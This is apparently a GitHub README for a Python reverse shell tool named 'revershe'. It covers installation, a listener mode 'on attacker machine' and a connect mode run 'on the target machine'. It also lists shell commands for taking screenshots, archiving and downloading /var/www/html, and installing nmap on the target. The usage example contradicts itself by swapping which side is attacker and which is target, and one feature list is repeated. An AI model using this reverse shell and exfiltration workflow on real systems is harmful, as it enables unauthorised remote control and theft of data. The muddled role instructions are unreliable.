# Python Reverse Shell Hacking
![carbon](https://github.com/user-attachments/assets/c6c5c0ac-6b10-42e4-aed8-0dd5249e5124)

## This tool is designed for:
* Penetration testing ⚔️
* Remote administration 🖥️
* File transfer between systems 📁
* Network troubleshooting 🌐

## Security Features

🔒 Port Customizable
- Can use any port (1-65535)

⚠️ Error Handling
- Clear error notification
- Doesn't crash when command fails

📜 Logging (In advanced version)
Records all activities to a log file

## ⚙️ Dependensi
```console
pip install colorama
```

##  🛠 Installation

1️⃣ System Requirements
* Python 3.x installed
* Terminal/command prompt access
* Internet connection (for dependency installation)

2️⃣ Installation Steps

💻 Linux/macOS
```console
# 1. Clone repositori (if any) or copy the script to file .py
git clone https://github.com/hidayat-tanjung/revershe.git  # Replace with original repo if available
cd reverse

# 2. Install dependensi (just colorama)
pip3 install colorama

# 3. Grant execution permission
chmod +x reverse.py  # Replace with your script file name

# 4. Run the tool
./reverse.py
```
🪟 Windows (PowerShell)
```console
# 1. Save script as `reverse.py`

# 2. Install dependencies
pip install colorama

# 3. Run the tool
python reverse.py
```

🔌 Mode Listener (Server)
```console
./reverse.py -l -p 4444  # Listen for connections on port 4444
```
Use this on attacker machine.

🎯 Mode Connect (Client)
```console
./reverse.py -c 192.168.1.100 -p 4444  # Contact the listener on the target IP
```
Run this on the target machine to connect to the listener.

If run without arguments, the tool will display an interactive menu:
```console
./reverse.py 
```
Select an option:

* `Start Listener` (Start the server)
* `Connect to Target` (Contact the server)
* `Show Help` (Instructions for use)

Usage example:

- Select option 1 (Start Listener)
- Enter the port (eg 4444)
- On the target computer will appear:
```console
[*] Listening on port 4444
```
As a Listener (Target):
```console
python3 reverse.py -l -p 4444
```
Output 
```console
[*] Listening on port 4444
[+] Connection from [IP_ATTACKER]
```
As an Attacker:
```console
python3 reverse.py -c [IP_TARGET] -p 4444
```
Output 
```console
[*] Connected to [IP_TARGET]:4444
shell>
```

## Fitur 
```console
shell> upload /path/lokal/file.txt
shell> download /path/remote/file.txt
shell> download /path/remote/folder  # Untuk direktori
shell> help       # Menampilkan bantuan
shell> sysinfo    # Info sistem target
shell> ls         # List direktori target
shell> cd /path   # Ganti direktori
shell> exit       # Keluar
shell> help       # Menampilkan bantuan
shell> sysinfo    # Info sistem target
shell> ls         # List direktori target
shell> cd /path   # Ganti direktori
shell> exit       # Keluar
shell> whoami
shell> ipconfig/ifconfig
shell> cd /path
shell> ls -la
shell> sysinfo  # Menampilkan info sistem target
shell> screencap -o /tmp/screen.png
shell> download /tmp/screen.png
shell> tar -czf /tmp/data.tar.gz /var/www/html
shell> download /tmp/data.tar.gz
shell> apt-get update && apt-get install -y nmap
```
## ⚡ Additional Features
- Transfer File
  - `upload file.txt` → Upload files to target
  - `download /path/file` → Download files from target
- Command Execution
  - Run regular shell commands(`ls, whoami, dll`.)
- Auto Compression
  - The folder will be compressed so `.tar.gz` before sending

📜 License
MIT License - Free for personal and commercial use

[![GitHub](https://img.shields.io/badge/GitHub-View_Project-blue?logo=github)](https://github.com/hidayat-tanjung/revershe)
